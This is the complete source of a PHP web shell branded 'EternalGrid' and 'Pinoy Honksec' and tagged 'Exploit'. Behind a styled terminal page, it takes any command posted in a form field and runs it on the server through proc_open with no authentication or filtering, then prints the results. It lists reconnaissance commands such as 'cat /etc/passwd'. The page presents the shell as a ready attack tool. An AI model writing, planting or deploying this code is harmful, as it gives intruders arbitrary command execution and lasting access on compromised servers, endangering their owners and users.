<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>EternalGrid — Command Shell</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#051426;
  --panel:#07121a;
  --accent:#5fd8ff;
  --muted:#86a9b6;
  --glow:0 18px 60px rgba(33,150,200,0.08);
}
*{box-sizing:border-box}
html,body{height:100%;margin:0;background:linear-gradient(180deg,#031425,var(--bg));font-family:"JetBrains Mono",monospace;color:#dff6ff}
.container{max-width:1100px;margin:36px auto;padding:18px}
.header{display:flex;gap:14px;align-items:center;padding:14px;border-radius:12px;background:linear-gradient(90deg,rgba(6,20,28,0.45),rgba(2,6,10,0.35));box-shadow:var(--glow)}
.seal{width:64px;height:64px;border-radius:10px;background:linear-gradient(180deg,#083240,#021a22);display:flex;align-items:center;justify-content:center;color:var(--accent);font-weight:700;border:1px solid rgba(95,216,255,0.06)}
h1{margin:0;font-size:18px;letter-spacing:1px}
.meta{color:var(--muted);font-size:13px;margin-top:6px}
.main { display:grid; grid-template-columns:220px 1fr; gap:16px; margin-top:18px; }
.panel {
  background: linear-gradient(180deg, rgba(255,255,255,0.01), transparent);
  border-radius:8px; padding:12px; color:var(--muted); font-size:13px;
  border:1px solid rgba(255,255,255,0.02);
}
.panel .badge { display:inline-block; padding:6px 10px; border-radius:999px; font-size:12px; background:rgba(95,216,255,0.04); color:var(--accent); }
.panel .item { margin-top:10px; }
.terminal{background:var(--panel);border-radius:10px;padding:16px;border:1px solid rgba(255,255,255,0.03);box-shadow:var(--glow);display:flex;flex-direction:column;min-height:180px}
#output{overflow:auto;white-space:pre-wrap;}
.line{margin:0 0 8px;font-size:13px}
.prompt{color:var(--accent)}
.system{color:#f5de7a}
.ok{color:#a8f3d2}
.form{display:flex;gap:10px;margin-top:12px}
input[type="text"]{flex:1;background:transparent;border:0;border-top:1px solid rgba(255,255,255,0.03);padding:10px 12px;color:inherit;font:inherit;outline:none;border-radius:6px}
button{background:linear-gradient(180deg,var(--accent),#2bb7d6);color:#012428;font-weight:700;border:0;padding:10px 12px;border-radius:6px;cursor:pointer}
.small{font-size:12px;color:var(--muted)}
@media (max-width:820px){
  .main{grid-template-columns:1fr; }
  .panel{order:2}
}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="seal">E G</div>
    <div>
      <h1>EternalGrid — Web Shell</h1>
      <div class="meta">A minimal shell.</div>
    </div>
  </div>
  <div class="main">
    <aside class="panel" aria-label="status panel">
      <div class="badge">Pinoy Honksec</div>
      <div class="item"><strong>Uptime:</strong> <span class="small" id="uptime">00:00:00</span></div>
      <div class="item"><strong>Common commands:</strong>
        <div class="small" style="margin-top:6px;line-height:1.4">
            ls -la<br>whoami<br>pwd<br>cat /etc/passwd
        </div>
      </div>
      <div class="item"><strong>Tags</strong>
        <div style="margin-top:6px">
          <span class="badge">Exploit</span>
          <span class="badge" style="margin-left:6px">Shell</span>
        </div>
      </div>
    </aside>
  <div class="terminal">
    <div id="output" aria-live="polite">
        <div class="line system">[EternalGrid] Minimal shell ready.</div>
        <?php
        $cmd = '';
        $output = '';
        $errors = '';

        function execute_command($cmd) {
            $descriptors = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];

            $process = proc_open($cmd, $descriptors, $pipes);

            if (is_resource($process)) {
                $output = stream_get_contents($pipes[1]);
                $errors = stream_get_contents($pipes[2]);
                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                $output = htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
                $errors = htmlspecialchars($errors, ENT_QUOTES, 'UTF-8');
                echo '<div class="line prompt">&gt; <strong>Command:</strong></div>' . $cmd . "\n\n";
                echo '<div class="line ok"><strong>Output:</strong></div>' . "\n" . $output . "\n";
                echo '<div class="line system"><strong>Errors:</strong></div>' . "\n" . $errors . "\n";
            }
        }
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
            $cmd = (string) $_POST['command'];
            execute_command($cmd);
        }
        ?>
    </div>
    <form method="POST" action="" class="form" autocomplete="off">
    <input type="text" name="command" placeholder="Enter your command" value="<?php echo htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8'); ?>">
    <button type="submit">Send</button>
    </form>
  </div>
</div>
<script>
  const start = Date.now();
  const uptimeEl = document.getElementById('uptime');
  function tick(){ const s=Math.floor((Date.now()-start)/1000); const h=String(Math.floor(s/3600)).padStart(2,'0'); const m=String(Math.floor((s%3600)/60)).padStart(2,'0'); const sec=String(s%60).padStart(2,'0'); uptimeEl.textContent = `${h}:${m}:${sec}`; }
  setInterval(tick,1000);
  tick();
  (function(){ const out=document.getElementById('output'); if(out) out.scrollTop = out.scrollHeight; })();
  document.querySelector('input[name="command"]').focus();
</script>
</body>
</html>